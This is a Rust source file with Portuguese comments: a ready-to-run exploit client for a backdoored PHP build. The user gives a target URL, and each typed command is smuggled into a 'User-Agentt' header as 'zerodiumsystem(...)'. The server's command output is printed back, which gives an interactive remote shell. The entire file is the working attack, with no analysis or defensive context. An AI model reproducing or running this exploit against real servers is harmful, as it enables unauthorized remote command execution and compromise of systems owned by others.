use colored::Colorize;
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
use std::io::{self, Write};

fn main() {
    // Configura o tratamento de Ctrl+C
    ctrlc::set_handler(|| {
        println!("{}", "\nSaindo...".cyan());
        std::process::exit(0);
    })
    .expect("Erro ao configurar Ctrl+C");

    // Solicita a URL do host
    print!("{}", "Digite a URL completa do host: ".cyan());
    io::stdout().flush().unwrap();
    let mut host = String::new();
    io::stdin().read_line(&mut host).expect("Erro ao ler a URL");
    let host = host.trim();

    // Validação básica da URL
    if !host.starts_with("http://") && !host.starts_with("https://") {
        println!(
            "{}",
            "URL inválida! Deve começar com http:// ou https://".red()
        );
        return;
    }

    // Cria um cliente HTTP
    let client = Client::new();

    // Teste inicial do host
    match client.get(host).send() {
        Ok(response) if response.status().is_success() => {
            println!("{}", "\nShell interativo aberto!".green());
        }
        Ok(response) => {
            println!(
                "{}",
                format!("\nHost retornou status: {}", response.status()).red()
            );
            println!("{}", "Host não está acessível, abortando...".red());
            return;
        }
        Err(e) => {
            println!("{}", format!("\nErro: {}", e).red());
            println!("{}", "Host não está acessível, abortando...".red());
            return;
        }
    }

    // Loop interativo de comandos
    loop {
        // Lê o comando do usuário
        print!("{}", "$ ".yellow());
        io::stdout().flush().unwrap();
        let mut cmd = String::new();
        io::stdin()
            .read_line(&mut cmd)
            .expect("Erro ao ler o comando");
        let cmd = cmd.trim();

        if cmd.is_empty() {
            continue; // Ignora comandos vazios
        }

        if cmd == "exit" {
            println!("{}", "Saindo...".cyan());
            return;
        }

        // Constrói os cabeçalhos HTTP
        let mut headers = HeaderMap::new();
        headers.insert(
            USER_AGENT,
            HeaderValue::from_static("Mozilla/5.0 (Linux) Firefox/78.0"),
        );
        let user_agentt = format!("zerodiumsystem('{}');", cmd);
        headers.insert("User-Agentt", HeaderValue::from_str(&user_agentt).unwrap());

        // Envia a requisição
        match client.get(host).headers(headers).send() {
            Ok(res) => {
                let text = res.text().unwrap();
                if let Some(index) = text.find("<!DOCTYPE html>") {
                    let output = &text[..index];
                    println!("{}", output.trim().white());
                } else {
                    println!("{}", text.trim().white());
                }
            }
            Err(e) => println!("{}", format!("Erro: {}", e).red()),
        }
    }
}
